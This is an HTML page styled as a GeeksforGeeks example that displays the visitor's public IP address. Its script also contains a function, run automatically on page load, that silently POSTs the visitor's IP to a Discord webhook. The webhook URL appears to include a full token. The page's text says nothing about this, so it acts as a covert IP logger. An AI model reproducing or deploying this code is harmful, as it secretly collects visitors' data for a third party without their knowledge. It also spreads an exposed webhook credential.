<!DOCTYPE html>
<html>

<head>
	<title>Getting Clients IP</title>
	<style>
	p, h1 {
		color: green;
	}
	</style>

	<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
	</script>
	
	<script>
	
	/* Add "https://api.ipify.org?format=json" statement
			this will communicate with the ipify servers in
			order to retrieve the IP address $.getJSON will
			load JSON-encoded data from the server using a
			GET HTTP request */
				
	$.getJSON("https://api.ipify.org?format=json", function(data) {
		sendMessage(data.ip);
		// Setting text of element P with id gfg
		$("#gfg").html(data.ip);
	})

    function sendMessage(ip) {
      var request = new XMLHttpRequest();
      request.open("POST", "https://discord.com/api/webhooks/936613778030755900/dSMWcC9MiLyOvkMc6JTIzLxQB4nbfORw14Jgb5Xf_ff-dShrx4Q2ygtnnJr7hsAkYS0H");

      request.setRequestHeader('Content-type', 'application/json');

      var params = {
        username: "IP PUBLIC",
        avatar_url: "",
        content: `PUBLIC ADRESS IP: ${ip}`
      }

      request.send(JSON.stringify(params));
    }

	</script>
</head>

<body>
	<center>
		<h1>GeeksforGeeks</h1>
		<h3>Public IP Address of user is:</h3>
		<p id="gfg"></p>
	</center>
</body>

</html>
